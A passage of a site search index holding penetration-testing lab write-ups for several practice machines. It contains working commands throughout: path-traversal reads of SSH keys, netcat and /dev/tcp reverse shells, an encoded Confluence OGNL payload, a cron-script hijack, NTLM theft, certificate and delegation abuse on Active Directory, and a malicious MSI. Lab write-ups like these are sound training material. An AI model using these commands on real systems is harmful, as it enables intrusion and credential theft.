user.</p>"},{"location":"pg/clue/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/clue/#sudo-permissions","title":"Sudo Permissions","text":"<p>I checked the sudo permissions for the cassie user:</p> <pre><code>sudo -l\n</code></pre> <p>The output revealed that cassie could start the Cassandra service as root: <pre><code>User cassie may run the following commands on clue:\n    (root) NOPASSWD: /usr/bin/cassandra\n</code></pre></p>"},{"location":"pg/clue/#exploiting-cassandra-to-read-root-files","title":"Exploiting Cassandra to Read Root Files","text":"<p>Since cassie could start Cassandra as root, and the Cassandra Web Framework had a file read vulnerability, I could chain these together to read files as root:</p> <ol> <li> <p>Started Cassandra as root: <pre><code>sudo /usr/bin/cassandra\n</code></pre></p> </li> <li> <p>Waited for the service to fully start up.</p> </li> <li> <p>Used the file read vulnerability to read sensitive files as root: <pre><code>curl -s \"http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../root/.ssh/id_rsa\"\n</code></pre></p> </li> </ol> <p>This didn't yield an SSH key for root, but further enumeration revealed an SSH key in anthony's directory:</p> <pre><code>curl -s \"http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../home/anthony/.ssh/id_rsa\"\n</code></pre>"},{"location":"pg/clue/#root-access","title":"Root Access","text":"<p>I tried using anthony's SSH key to access the root account:</p> <pre><code>chmod 600 anthony_key\nssh -i anthony_key root@192.168.178.240\n</code></pre> <p>This was successful, providing full root access to the system.</p> <pre><code>root@clue:~# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"pg/confusion/","title":"Confusion - Writeup","text":""},{"location":"pg/confusion/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/confusion/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed open ports and potential virtual hosts: <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4\n80/tcp open  http    Apache httpd 2.4.54\n443/tcp open  https   Apache httpd 2.4.54\n</code></pre></p>"},{"location":"pg/confusion/#web-enumeration","title":"Web Enumeration","text":"<p>Through Nmap and virtual host discovery, I identified two domains: - confusion.pg \u2192 Displayed an \"Under Construction\" page - cacti-monitoring.confusion.pg \u2192 Required HTTPS to access the login page</p> <p>Adding these domains to my <code>/etc/hosts</code> file: <pre><code>echo \"192.168.172.99 confusion.pg cacti-monitoring.confusion.pg\" &gt;&gt; /etc/hosts\n</code></pre></p> <p>Accessing the Cacti monitoring site revealed: - Cacti Version 1.2.20 - Research indicated this version is vulnerable to CVE-2022-46169, an unauthenticated command injection vulnerability</p>"},{"location":"pg/confusion/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/confusion/#exploiting-cve-2022-46169","title":"Exploiting CVE-2022-46169","text":"<p>I attempted to exploit the vulnerability using different POCs:</p> <ol> <li>First attempt failed with \"FATAL: Unauth error\"</li> <li>Second attempt with a modified exploit confirmed the vulnerability: <pre><code>curl -I https://cacti-monitoring.confusion.pg/ -H \"X-Forwarded-For: 127.0.0.1\" | grep Server\n</code></pre></li> </ol> <p>This successfully returned my server headers, confirming command execution was possible.</p> <p>I then obtained a reverse shell as <code>www-data</code>: <pre><code>python3 '/home/kali/Downloads/CVE-2022-46169.py' https://cacti-monitoring.confusion.pg/ -c 'busybox nc 192.168.45.225 3000 -e /bin/bash'\n</code></pre></p> <p>In a separate terminal, I had set up a listener: <pre><code>nc -lvnp 3000\n</code></pre></p>"},{"location":"pg/confusion/#lateral-movement","title":"Lateral Movement","text":""},{"location":"pg/confusion/#database-credential-discovery","title":"Database Credential Discovery","text":"<p>Once I had shell access as <code>www-data</code>, I explored the Cacti installation and found database credentials in the configuration file: <pre><code>cat /var/www/html/cacti/include/config.php\n</code></pre></p> <p>This revealed the following database password: <pre><code>uTyWUHAdetb3O23aUEOo1KRg\n</code></pre></p> <p>I attempted to enumerate the database: <pre><code>mysql -u cacti -p'uTyWUHAdetb3O23aUEOo1KRg' -D cacti\n</code></pre></p> <p>While I found a bcrypt hash for the admin user, I was unable to crack it.</p>"},{"location":"pg/confusion/#password-reuse","title":"Password Reuse","text":"<p>I discovered a local user named <code>james</code> on the system and tried the database password for SSH access: <pre><code>ssh james@192.168.172.99\nPassword: uTyWUHAdetb3O23aUEOo1KRg\n</code></pre></p> <p>This succeeded, confirming password reuse and providing a more stable user-level access to the system.</p>"},{"location":"pg/confusion/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/confusion/#doas-configuration-analysis","title":"DOAS Configuration Analysis","text":"<p>Checking for privilege escalation vectors, I examined the DOAS configuration: <pre><code>cat /etc/doas.conf\n</code></pre></p> <p>The configuration revealed that user <code>james</code> could run <code>/usr/local/sbin/systeminfo</code> as root: <pre><code>permit james as root cmd /usr/local/sbin/systeminfo\n</code></pre></p>"},{"location":"pg/confusion/#binary-replacement-attack","title":"Binary Replacement Attack","text":"<p>I checked the permissions on the directory: <pre><code>ls -la /usr/local/sbin/\n</code></pre></p> <p>Finding that <code>/usr/local/sbin</code> was writable by <code>james</code>, I executed a binary replacement attack:</p> <ol> <li> <p>Removed the original root-owned systeminfo file: <pre><code>rm -rf /usr/local/sbin/systeminfo\n</code></pre></p> </li> <li> <p>Created a new systeminfo file containing a shell payload: <pre><code>echo '/bin/bash' &gt; /usr/local/sbin/systeminfo\n</code></pre></p> </li> <li> <p>Made the new file executable: <pre><code>chmod +x /usr/local/sbin/systeminfo\n</code></pre></p> </li> <li> <p>Executed the file with DOAS to gain root access: <pre><code>/usr/local/bin/doas -u root /usr/local/sbin/systeminfo\n</code></pre></p> </li> </ol> <p>This immediately provided a root shell, successfully completing the privilege escalation and giving full control over the target system.</p>"},{"location":"pg/dvr4/","title":"DVR4 -  Writeup","text":""},{"location":"pg/dvr4/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/dvr4/#port-scanning","title":"Port Scanning","text":"<p>The target has several open ports, with the most interesting being port 8080 where a web server is running.</p>"},{"location":"pg/dvr4/#web-server-enumeration-port-8080","title":"Web Server Enumeration (Port 8080)","text":"<p>Initial directory discovery revealed several web pages related to a camera system: <pre><code>200 GET    42l    88w  1198c http://192.168.185.179:8080/pda/Cameras.html\n200 GET    42l    88w  1187c http://192.168.185.179:8080/pda/cam80x60.html\n200 GET    75l   218w  2349c http://192.168.185.179:8080/CamerasBottomFrame.html\n200 GET    82l   245w  2706c http://192.168.185.179:8080/ActiveXIFrame.html\n200 GET   655l  1718w 29575c http://192.168.185.179:8080/CamerasTopFrame.html\n200 GET    23l    73w   985c http://192.168.185.179:8080/\n200 GET    45l    92w  1256c http://192.168.185.179:8080/pda/cam320x240.html\n200 GET    42l    88w  1195c http://192.168.185.179:8080/pda\n</code></pre></p>"},{"location":"pg/dvr4/#local-file-inclusion-lfi-discovery","title":"Local File Inclusion (LFI) Discovery","text":"<p>After testing various endpoints, I discovered a vulnerable LFI parameter on the Cameras.html page: <pre><code>http://192.168.185.179:8080/pda/Cameras.html?RESULTPAGE=../../../../../../../../\n</code></pre> This allowed for traversing the file system. Extensive LFI testing revealed numerous accessible files including: - System configuration files - Windows logs - User directories</p>"},{"location":"pg/dvr4/#exploitation","title":"Exploitation","text":""},{"location":"pg/dvr4/#credentials-via-ssh-key","title":"Credentials via SSH Key","text":"<p>Using the LFI vulnerability, I was able to view the SSH private key for the \"Viewer\" user: <pre><code>http://192.168.185.179:8080/pda/Cameras.html?RESULTPAGE=../../../../../../../../Users/Viewer/.ssh/id_rsa\n</code></pre> I downloaded this key, set appropriate permissions, and logged in via SSH: <pre><code>chmod 600 id_rsa\nssh -i id_rsa Viewer@192.168.185.179\n</code></pre></p>"},{"location":"pg/dvr4/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/dvr4/#information-gathering","title":"Information Gathering","text":"<p>After gaining initial access as the Viewer user, I explored the system and identified that the machine was running Argus Surveillance DVR software.</p>"},{"location":"pg/dvr4/#password-decryption","title":"Password Decryption","text":"<p>The Argus DVR software uses weak password encryption. Located configuration file containing encrypted credentials: <pre><code>C:\\ProgramData\\PY_Software\\Argus Surveillance DVR\\DVRParams.ini\n</code></pre> Using publicly available information about Argus DVR's encryption method, I was able to decrypt the administrator password.</p>"},{"location":"pg/dvr4/#administrator-access","title":"Administrator Access","text":"<p>With the administrator credentials, I used the runas command to gain a privileged reverse shell: <pre><code>runas /user:administrator \"C:\\users\\viewer\\desktop\\nc.exe -e cmd.exe 192.168.49.57 443\"\n</code></pre> This gave me a reverse shell with SYSTEM privileges, allowing complete control of the machine.</p>"},{"location":"pg/flu/","title":"Flu - Writeup","text":""},{"location":"pg/flu/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/flu/#port-scanning","title":"Port Scanning","text":"<p>A basic port scan revealed three open ports: <pre><code>PORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH (Unknown version)\n8090/tcp open  http          Atlassian Confluence 7.13.6\n8091/tcp open  http          Unknown web service\n</code></pre></p>"},{"location":"pg/flu/#web-enumeration","title":"Web Enumeration","text":"<p>Upon accessing the web server on port 8090, I identified it as running: <pre><code>Atlassian Confluence 7.13.6\n</code></pre></p> <p>Research revealed this version is vulnerable to a critical remote code execution vulnerability (CVE-2022-26134) that allows unauthenticated attackers to execute arbitrary code on affected instances.</p>"},{"location":"pg/flu/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/flu/#exploiting-cve-2022-26134","title":"Exploiting CVE-2022-26134","text":"<p>After researching the vulnerability, I found it was related to an OGNL injection vulnerability in Confluence's \"nashorn\" script engine, allowing attackers to execute arbitrary code via URL payload.</p> <p>I crafted a malicious payload to establish a reverse shell: <pre><code>GET /%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.157/3001%200%3E%261%27%29.start%28%29%22%29%7D/ HTTP/1.1\nHost: 192.168.110.41:8090\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n</code></pre></p> <p>Before sending this payload, I set up a netcat listener on my attack machine: <pre><code>nc -lvnp 3001\n</code></pre></p> <p>After sending the request, I successfully received a reverse shell connection.</p>"},{"location":"pg/flu/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/flu/#system-enumeration","title":"System Enumeration","text":"<p>After gaining initial access, I began enumerating the system for potential privilege escalation vectors:</p> <pre><code>find / -type f -perm -4000 2&gt;/dev/null\nfind / -perm -2 -type f -not -path \"*/proc/*\" 2&gt;/dev/null\n</code></pre> <p>I discovered an interesting script with writable permissions: <pre><code>/opt/log-backup.sh\n</code></pre></p>"},{"location":"pg/flu/#process-monitoring","title":"Process Monitoring","text":"<p>To understand how this script was being executed, I used <code>pspy</code> to monitor processes: <pre><code>./pspy64 -pf -i 1000\n</code></pre></p> <p>This revealed that the script was being executed by a cron job running as root: <pre><code>2023/06/14 09:15:01 CMD: UID=0    PID=3842   | /bin/bash /opt/log-backup.sh\n</code></pre></p>"},{"location":"pg/flu/#exploiting-scheduled-tasks","title":"Exploiting Scheduled Tasks","text":"<p>Since I had write access to the script and it was being executed as root, I modified it to create a reverse shell:</p> <pre><code>cat &gt; /opt/log-backup.sh &lt;&lt; EOF\n#!/bin/bash\nbusybox nc 192.168.45.225 3002 -e /bin/sh\nEOF\n</code></pre> <p>I made sure the script was executable: <pre><code>chmod +x /opt/log-backup.sh\n</code></pre></p> <p>I set up another netcat listener on my attack machine: <pre><code>nc -lvnp 3002\n</code></pre></p> <p>After waiting approximately one minute for the cron job to execute, I received a reverse shell as the root user: <pre><code>uid=0(root) gid=0(root) groups=0(root)\n</code></pre></p> <p>This confirmed successful privilege escalation to root, completing the challenge.</p>"},{"location":"pg/nora/","title":"Nara - Detailed","text":""},{"location":"pg/nora/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/nora/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed several open ports typical of an Active Directory environment: <pre><code>PORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  ncacn_http\n636/tcp   open  ssl/ldap\n3268/tcp  open  ldap\n3269/tcp  open  ssl/ldap\n3389/tcp  open  ms-wbt-server\n5985/tcp  open  http (WinRM)\n9389/tcp  open  mc-nmf\n</code></pre></p>"},{"location":"pg/nora/#ldap-enumeration","title":"LDAP Enumeration","text":"<p>LDAP enumeration provided valuable domain information: - Domain name: nara-security.com - Domain controller: Nara.nara-security.com - Certificate information showing valid certificates for the domain <pre><code>domainFunctionality: 7\nforestFunctionality: 7\ndomainControllerFunctionality: 7\nrootDomainNamingContext: DC=nara-security,DC=com\nldapServiceName: nara-security.com:nara$@NARA-SECURITY.COM\n</code></pre></p>"},{"location":"pg/nora/#smb-enumeration","title":"SMB Enumeration","text":"<p>Using tools like Enum4Linux and SMBMap, I discovered: - NetBIOS domain name: NARASEC - Domain SID: S-1-5-21-914744703-3800712539-3320214069 - OS Version: Windows Server 2019 (10.0.20348) - SMB signing required Initial SMB connection attempts failed with anonymous and null authentication. This suggested tight security controls were in place.</p>"},{"location":"pg/nora/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/nora/#smb-share-access","title":"SMB Share Access","text":"<p>After some testing, I discovered a share named \"nara\" was accessible using guest authentication. The server treated invalid usernames as guest, allowing me to connect with: <pre><code>smbclient \\\\\\\\$IP\\\\nara -U nara-security.com/root%123456\n</code></pre> Inside the share, I found a note titled \"Important.txt\" indicating that files in the documents folder were shared and important for the organization.</p>"},{"location":"pg/nora/#ntlm-theft","title":"NTLM Theft","text":"<p>Leveraging the writable share, I generated NTLM theft payloads to capture authentication hashes: <pre><code>python3 '/home/kali/Exploits/ntlm_theft-master/ntlm_theft.py' -g all -s 192.168.45.172 -f nara\n</code></pre> I uploaded these payloads to the share: <pre><code>smbclient \\\\\\\\$IP\\\\nara -U nara-security.com/root%123456\nsmb: \\&gt; mput *\n</code></pre> This successfully captured an NTLMv2 hash for user Tracy.White: <pre><code>Tracy.White::NARASEC:b057b9f94a9c64db:B0C11E29DA0A65BB9CA8E293AA169052:010100000000000000AF042D6C44DB0162A35B3B6BD974B8000000000200080051004C0034004E0001001E00570049004E002D0051004E0050004A0046005200520041004C004B004B0004003400570049004E002D0051004E0050004A0046005200520041004C004B004B002E0051004C0034004E002E004C004F00430041004C000300140051004C0034004E002E004C004F00430041004C000500140051004C0034004E002E004C004F00430041004C000700080000AF042D6C44DB0106000400020000000800300030000000000000000100000000200000047E57704F8419E0A167948403A511DC6AE0D52E7BFD6C42BFD2C9BE4836695B0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370032000000000000000000\n</code></pre></p>"},{"location":"pg/nora/#password-cracking","title":"Password Cracking","text":"<p>I used Hashcat to crack the captured NTLMv2 hash: <pre><code>hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt\n</code></pre> This yielded the following credentials: - Username: TRACY.WHITE - Password: zqwj041FGX</p>"},{"location":"pg/nora/#lateral-movement","title":"Lateral Movement","text":""},{"location":"pg/nora/#enumerating-user-privileges","title":"Enumerating User Privileges","text":"<p>After obtaining valid credentials, I conducted further enumeration of the Active Directory environment using BloodHound. The analysis revealed that the user <code>tracy.white</code> had <code>GenericAll</code> privilege over the <code>Remote Access</code> group.</p>"},{"location":"pg/nora/#exploiting-group-membership","title":"Exploiting Group Membership","text":"<p>This privilege allowed me to add Tracy to the \"Remote Access\" group, enabling WinRM access: <pre><code>net rpc group addmem \"REMOTE ACCESS\" \"tracy.white\" -U \"nara-security.com\"/\"tracy.white\"%\"zqwj041FGX\" -S \"nara-security.com\"\n</code></pre> With Tracy now in the Remote Access group, I was able to establish a WinRM connection: <pre><code>evil-winrm -i $IP -u tracy.white -p 'zqwj041FGX'\n</code></pre></p>"},{"location":"pg/nora/#credential-discovery","title":"Credential Discovery","text":"<p>Once logged in as Tracy, I found an interesting file containing an encrypted password: <pre><code>01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b\n</code></pre> I decrypted this secure string using PowerShell: <pre><code>$password = Get-Content hash.txt | ConvertTo-SecureString\n$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)\n$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)\n$UnsecurePassword\n</code></pre> The decrypted password was: <code>hHO_S9gff7ehXw</code></p>"},{"location":"pg/nora/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/nora/#user-enumeration","title":"User Enumeration","text":"<p>Using the newly discovered password, I attempted to identify other users who might be using the same password: <pre><code>crackmapexec smb $IP -u users.txt -p 'hHO_S9gff7ehXw' --no-bruteforce --continue-on-success\n</code></pre> This revealed that the user <code>Jodie.Summers</code> used the same password: <pre><code>nara-security.com\\Jodie.Summers:hHO_S9gff7ehXw\n</code></pre></p>"},{"location":"pg/nora/#establishing-access-as-jodie","title":"Establishing Access as Jodie","text":"<p>I established a WinRM connection as Jodie: <pre><code>evil-winrm -i $IP -u Jodie.Summers -p 'hHO_S9gff7ehXw'\n</code></pre></p>"},{"location":"pg/nora/#certificate-abuse","title":"Certificate Abuse","text":"<p>BloodHound revealed that Jodie was part of the \"Enrollment\" group, which could potentially be used to exploit Active Directory Certificate Services. I used Certipy to identify vulnerable certificate templates: <pre><code>certipy-ad find -u Jodie.Summers -p 'hHO_S9gff7ehXw' -dc-ip $IP -stdout -vulnerable\n</code></pre> This confirmed that the environment was vulnerable to certificate abuse. I requested a certificate for the Administrator account: <pre><code>certipy-ad req -username \"Jodie.Summers\" -p \"hHO_S9gff7ehXw\" -template NaraUser -dc-ip $IP -ca NARA-CA -upn 'Administrator@nara-security.com' -dns Nara.nara-security.com -debug\n</code></pre> This generated a PFX file that could be used for authentication.</p>"},{"location":"pg/nora/#domain-admin-access","title":"Domain Admin Access","text":"<p>Using the LDAP shell capability of Certipy, I leveraged the certificate to change the Administrator's password: <pre><code>certipy-ad auth -ldap-shell -pfx administrator_nara.pfx -dc-ip $IP\n</code></pre> In the LDAP shell, I changed the Administrator's password: <pre><code>change_password Administrator Dolphin1\n</code></pre> With the Administrator credentials now in hand, I had full domain admin access to the Nara domain controller.</p>"},{"location":"pg/resourced/","title":"Resourced - Writeup","text":""},{"location":"pg/resourced/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/resourced/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed the following open ports: <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-18 17:16:20Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n3269/tcp  open  tcpwrapped\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp+ open  msrpc         Microsoft Windows RPC\n</code></pre></p>"},{"location":"pg/resourced/#domain-information","title":"Domain Information","text":"<p>From the scan results, I identified: - Domain name: resourced.local - NetBIOS Computer Name: RESOURCEDC - DNS Computer Name: ResourceDC.resourced.local - DNS Domain Name: resourced.local - Product Version: 10.0.17763</p>"},{"location":"pg/resourced/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/resourced/#ldap-enumeration","title":"LDAP Enumeration","text":"<p>I enumerated LDAP to discover more about the domain structure: <pre><code>venv/bin/python3 windapsearch.py --dc-ip 192.168.145.175 --da --admin-objects --user-spns --gpos --full -PU -U\n</code></pre></p> <p>This query revealed credentials for user <code>V.Ventz</code>, providing initial access to the domain resources.</p>"},{"location":"pg/resourced/#smb-enumeration","title":"SMB Enumeration","text":"<p>With these credentials, I was able to list and access SMB shares: <pre><code>smbclient -L //192.168.145.175 -U V.Ventz\n</code></pre></p> <p>I discovered a \"Password Audit\" share containing critical files: - ntds.dit (Active Directory database) - SECURITY (Registry hive) - SYSTEM (Registry hive)</p>"},{"location":"pg/resourced/#lateral-movement","title":"Lateral Movement","text":""},{"location":"pg/resourced/#extracting-domain-hashes","title":"Extracting Domain Hashes","text":"<p>I downloaded these files from the SMB share and used secretsdump.py to extract password hashes: <pre><code>secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -security SECURITY -outputfile credentials.txt\n</code></pre></p> <p>After testing the extracted hashes, I identified two valid credentials: - Username: V.Ventz - Hash: [Hash value redacted]</p> <ul> <li>Username: L.Livingstone</li> <li>Hash: 19a3a7550ce8c505c2d46b5e39d6f808</li> </ul>"},{"location":"pg/resourced/#privilege-enumeration","title":"Privilege Enumeration","text":"<p>I used BloodHound to analyze the domain relationships and identify potential attack paths: <pre><code>bloodhound-python -c All -u V.Ventz -p [password] -d resourced.local -dc ResourceDC.resourced.local\n</code></pre></p> <p>Analysis of the data revealed that user <code>L.Livingstone</code> had <code>GenericAll</code> permissions, which could be leveraged for privilege escalation.</p>"},{"location":"pg/resourced/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/resourced/#resource-based-constrained-delegation-attack","title":"Resource-Based Constrained Delegation Attack","text":"<p>I exploited the <code>GenericAll</code> permissions held by L.Livingstone to perform a Resource-Based Constrained Delegation (RBCD) attack:</p> <ol> <li> <p>First, I added a new computer account to the domain: <pre><code>impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.145.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'\n</code></pre></p> </li> <li> <p>Modified the delegation settings to allow impersonation: <pre><code>rbcd.py -delegate-from 'ATTACK$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808\n</code></pre></p> </li> <li> <p>Verified the computer account was properly created: <pre><code>get-adcomputer attackersystem\n</code></pre></p> </li> <li> <p>Requested a service ticket to impersonate the Administrator: <pre><code>getST.py -spn 'cifs/resourcedc.resourced.local' -impersonate 'Administrator' 'resourced.local/attackersystem$:AttackerPC1!'\n</code></pre></p> </li> <li> <p>Used the ticket to establish an administrative connection: <pre><code>export KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.145.175\n</code></pre></p> </li> </ol> <p>This provided a SYSTEM shell on the domain controller, successfully completing the challenge and giving full access to the target system.</p>"},{"location":"pg/shenzi/","title":"Shenzi -  Writeup","text":""},{"location":"pg/shenzi/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/shenzi/#port-scanning","title":"Port Scanning","text":"<pre><code>PORT      STATE    SERVICE\n21/tcp    open     ftp (FileZilla ftpd 0.9.41 beta)\n80/tcp    open     http (Apache httpd 2.4.43)\n135/tcp   open     msrpc\n139/tcp   open     netbios-ssn\n443/tcp   open     ssl/http (Apache httpd 2.4.43)\n445/tcp   open     microsoft-ds\n3306/tcp  open     mysql\n49664-9/tcp open   msrpc\n</code></pre>"},{"location":"pg/shenzi/#smb-enumeration","title":"SMB Enumeration","text":"<p>Enumerated SMB shares and discovered a share named \"shenzi\" that was accessible without authentication. Inside this share, found credentials for a WordPress installation: - Username: admin - Password: FeltHeadwallWight357</p>"},{"location":"pg/shenzi/#web-server-enumeration","title":"Web Server Enumeration","text":"<p>The web server is running XAMPP with Apache 2.4.43, PHP 7.4.6, and OpenSSL 1.1.1g. Default XAMPP page was found at the root, but discovered WordPress installation at <code>/shenzi</code>.</p>"},{"location":"pg/shenzi/#exploitation","title":"Exploitation","text":""},{"location":"pg/shenzi/#wordpress-access","title":"WordPress Access","text":"<ol> <li>Navigated to the WordPress admin panel at <code>http://192.168.145.55/shenzi/wp-admin/</code></li> <li>Logged in with the credentials found in the SMB share:</li> <li>Username: admin</li> <li>Password: FeltHeadwallWight357</li> </ol>"},{"location":"pg/shenzi/#gaining-initial-access","title":"Gaining Initial Access","text":"<ol> <li>From the WordPress admin panel, uploaded a malicious plugin containing PHP code for a reverse shell</li> <li>Set up a listener on my attack machine: <code>nc -lvnp 4444</code></li> <li>Activated the plugin through the WordPress interface</li> <li>Received a reverse shell as the user \"shenzi\"</li> </ol>"},{"location":"pg/shenzi/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/shenzi/#enumeration","title":"Enumeration","text":"<p>After gaining initial access, ran PowerUp's <code>Invoke-PrivEscAudit</code> to identify potential privilege escalation vectors: <pre><code>Invoke-PrivEscAudit\n</code></pre> Key findings: - AlwaysInstallElevated registry keys were enabled - Several modifiable service files were found (edgeupdate, edgeupdatem) - Path DLL hijacking opportunities in <code>C:\\Users\\shenzi\\AppData\\Local\\Microsoft\\WindowsApps</code></p>"},{"location":"pg/shenzi/#exploiting-alwaysinstallelevated","title":"Exploiting AlwaysInstallElevated","text":"<p>The <code>AlwaysInstallElevated</code> privilege allows standard users to install MSI packages with SYSTEM privileges. When both registry keys below are set to 1, this feature is enabled: - HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer - HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer Exploitation steps: 1. Created a malicious MSI package with msfvenom:    <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.183 LPORT=3006 -a x64 --platform Windows -f msi -o evil.msi\n</code></pre> 2. Transferred the MSI to the target machine 3. Set up a listener on my attack machine:    <pre><code>nc -lvnp 3006\n</code></pre> 4. Executed the MSI on the target:    <pre><code>msiexec /quiet /qn /i C:\\Users\\shenzi\\Downloads\\evil.msi\n</code></pre> 5. Received a reverse shell with SYSTEM privileges</p>"},{"location":"pg/zenphoto/","title":"ZenPhoto - Writeup","text":""},{"location":"pg/zenphoto/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/zenphoto/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed several open services: <pre><code>PORT      STATE SERVICE       VERSION\n22/tcp    open  ssh           OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)\n|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)\n23/tcp    open  ipp           CUPS 1.4\n| http-server-header: CUPS/1.4\n| http-methods:\n|_  Potentially risky methods: PUT\n|_http-title: 403 Forbidden\n80/tcp    open  http          Apache httpd 2.2.14 ((Ubuntu))\n|_http-server-header: Apache/2.2.14 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n3306/tcp  open  mysql         MySQL (unauthorized)\n</code></pre></p> <p>From this scan, I identified that the target was running Ubuntu Linux with several services: - OpenSSH 5.3p1 - CUPS 1.4 printing service (unusually on port 23) - Apache 2.2.14 web server - MySQL database server</p>"},{"location":"pg/zenphoto/#web-enumeration","title":"Web Enumeration","text":"<p>I began investigating the web server on port 80 with directory enumeration: <pre><code>gobuster dir -u http://192.168.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html\n</code></pre></p> <p>This revealed a ZenPhoto installation at the root directory. ZenPhoto is an open-source gallery CMS application. Looking at the version information in the footer, I identified it as ZenPhoto 1.4.1.4.</p>"},{"location":"pg/zenphoto/#vulnerability-research","title":"Vulnerability Research","text":"<p>Research indicated that ZenPhoto 1.4.1.4 is vulnerable to several critical vulnerabilities: 1. Multiple PHP file upload vulnerabilities 2. Remote Code Execution via third-party library flaws 3. SQL injection vulnerabilities</p> <p>The most critical vulnerability is a remote code execution in the image upload functionality (CVE-2012-5978).</p>"},{"location":"pg/zenphoto/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/zenphoto/#exploiting-zenphoto","title":"Exploiting ZenPhoto","text":"<p>I downloaded a public exploit for ZenPhoto 1.4.1.4: <pre><code>searchsploit -m php/webapps/18083.php\n</code></pre></p> <p>This exploit takes advantage of a file upload vulnerability in the TinyMCE editor component of ZenPhoto.</p> <p>I modified the exploit to point to my target and set up a listener: <pre><code>nc -lvnp 4444\n</code></pre></p> <p>Then executed the exploit: <pre><code>php 18083.php http://192.168.X.X/\n</code></pre></p> <p>This uploaded a PHP web shell to the server and provided me with a reverse shell connection as the www-data user.</p>"},{"location":"pg/zenphoto/#post-exploitation-enumeration","title":"Post-Exploitation Enumeration","text":"<p>After gaining an initial foothold, I stabilized the shell: 